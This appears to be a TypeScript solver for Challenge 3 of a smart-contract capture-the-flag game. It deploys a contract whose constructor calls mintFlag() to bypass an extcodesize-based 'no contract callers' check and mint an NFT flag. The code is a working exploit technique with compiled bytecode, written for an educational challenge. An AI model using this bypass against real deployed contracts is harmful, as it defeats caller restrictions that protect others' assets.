import {
  createPublicClient,
  createWalletClient,
  getContract,
  http,
  encodeDeployData,
  parseAbi,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import * as chains from "viem/chains";
import * as dotenv from "dotenv";
import { contractsData } from "../contracts/types";

dotenv.config();

// Check for --local flag from command line arguments
const isLocal = process.argv.includes("--local");

// Chain selection
const TARGET_CHAIN = isLocal ? chains.hardhat : chains.optimism;

// Local chain account #0 private key
const LOCAL_CHAIN_1ST_ACCOUNT_PK =
  "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80" as const;

// Wallet private key for script execution
const MY_WALLET_PK = isLocal
    ? LOCAL_CHAIN_1ST_ACCOUNT_PK  // Always use Hardhat private key for local
    : (process.env.__RUNTIME_DEPLOYER_PRIVATE_KEY as `0x${string}`) || (() => {
      console.error("❌ __RUNTIME_DEPLOYER_PRIVATE_KEY configuration is required for Optimism network");
      console.error("   Please set the private key in packages/scripts/.env file");
      process.exit(1);
      return "" as `0x${string}`;
    })();
const myWalletAccount = privateKeyToAccount(MY_WALLET_PK);

// Wallet client (for sending transactions)
const walletClient = createWalletClient({
  account: myWalletAccount,
  chain: TARGET_CHAIN,
  transport: http(),
});

// Public client (for reading blockchain)
const publicClient = createPublicClient({
  chain: TARGET_CHAIN,
  transport: http(),
});

// Challenge3 contract instance
const challenge3Contract = getContract({
  // @ts-ignore Defined after deployment
  address: contractsData[TARGET_CHAIN.id].Challenge3.address,
  // @ts-ignore Defined after deployment
  abi: contractsData[TARGET_CHAIN.id].Challenge3.abi,
  client: { public: publicClient, wallet: walletClient },
});

// NFTFlags contract instance (for hasMinted check)
const nftFlagsContract = getContract({
  // @ts-ignore Defined after deployment
  address: contractsData[TARGET_CHAIN.id].NFTFlags.address,
  // @ts-ignore Defined after deployment
  abi: contractsData[TARGET_CHAIN.id].NFTFlags.abi,
  client: { public: publicClient, wallet: walletClient },
});

// Bytecode for the contract to solve Challenge 3
// This contract calls Challenge3's mintFlag() in the constructor
const SOLVER_CONTRACT_ABI = parseAbi([
  "constructor(address challenge3Address)",
]);

// Solidity code:
// pragma solidity ^0.8.0;
//
// interface IChallenge3 {
//     function mintFlag() external;
// }
//
// contract Challenge3Solver {
//     constructor(address challenge3Address) {
//         // Call mintFlag in the constructor
//         // At this point, the contract code is not yet deployed
//         IChallenge3(challenge3Address).mintFlag();
//     }
// }

// Compiled bytecode of the above Solidity code
// Version where constructor calls mintFlag
const SOLVER_BYTECODE = "0x6080604052348015600f57600080fd5b506040516100fd3803806100fd833981016040819052602c916082565b806001600160a01b031663e00d023f6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015606657600080fd5b505af11580156079573d6000803e3d6000fd5b505050505060b0565b600060208284031215609357600080fd5b81516001600160a01b038116811460a957600080fd5b9392505050565b603f806100be6000396000f3fe6080604052600080fdfea26469706673582212204082e0d6c4ddbb379ada2e2f95a9ce4cc7f6cb84c0756e58ea147174941d7cce64736f6c63430008140033";

async function solveChallenge3() {
  console.log("🚀 Starting to solve Challenge 3...");
  console.log("🌐 Network:", isLocal ? "Local (31337)" : "Optimism");
  console.log("");
  console.log("📚 Challenge 3 Mechanism:");
  console.log("   - Call mintFlag from a 'contract without code'");
  console.log("   - Code is not yet deployed during constructor execution");
  console.log("   - Call mintFlag() in the constructor");
  console.log("");

  console.log("📍 Solver address:", myWalletAccount.address);
  console.log("📍 Challenge3 address:", challenge3Contract.address);
  console.log("");

  try {
    // Check if Challenge 3 flag is already minted
    const hasMinted = await nftFlagsContract.read.hasMinted([
      myWalletAccount.address,
      3n
    ]);

    if (hasMinted) {
      console.log("✅ Challenge 3 flag is already minted");
      console.log("🎉 Challenge 3 is already complete!");
      return;
    }

    // Encode deployment data (with constructor arguments)
    const deployData = encodeDeployData({
      abi: SOLVER_CONTRACT_ABI,
      args: [challenge3Contract.address],
      bytecode: SOLVER_BYTECODE as `0x${string}`,
    });

    console.log("🎯 Deploying Solver contract (mintFlag executed in constructor)...");
    console.log("   - No code during constructor execution");
    console.log("   - Satisfies extcodesize(address(this)) == 0 condition");
    console.log("");

    // Deploy contract (constructor automatically calls mintFlag)
    const deployTx = await walletClient.deployContract({
      abi: SOLVER_CONTRACT_ABI,
      args: [challenge3Contract.address],
      bytecode: SOLVER_BYTECODE as `0x${string}`,
    });

    console.log("⏳ Transaction:", deployTx);
    const receipt = await publicClient.waitForTransactionReceipt({
      hash: deployTx
    });

    if (receipt.status === "success") {
      console.log("");
      console.log("🎉 Challenge 3 complete!");
      console.log("🚩 NFT Flag #3 has been minted!");
      console.log("");
      console.log("📚 What we learned:");
      console.log("   - Contract state during constructor execution");
      console.log("   - How to bypass extcodesize check");
      console.log("   - Understanding contract lifecycle");
      console.log("   - CREATE opcode behavior");
    } else {
      console.log("❌ Deployment failed");
      process.exit(1);
    }

  } catch (error: any) {
    // Treat as success if already minted
    if (error.message?.includes("User address has already minted for this challenge")) {
      console.log("✅ This address has already obtained the Challenge 3 NFT");
      console.log("🎉 Challenge 3 is already complete!");
      return;
    }

    console.error("❌ Error:", error.message || error);

    if (error.message?.includes("User address is not registered")) {
      console.log("");
      console.log("💡 Please complete Challenge 1 first");
    } else if (error.message?.includes("Code at address")) {
      console.log("");
      console.log("💡 Hint:");
      console.log("   - No code during constructor execution");
      console.log("   - Can also use CREATE2 method");
    }
    process.exit(1);
  }
}

// Execute script
solveChallenge3().catch((error) => {
  console.error(error);
  process.exit(1);
});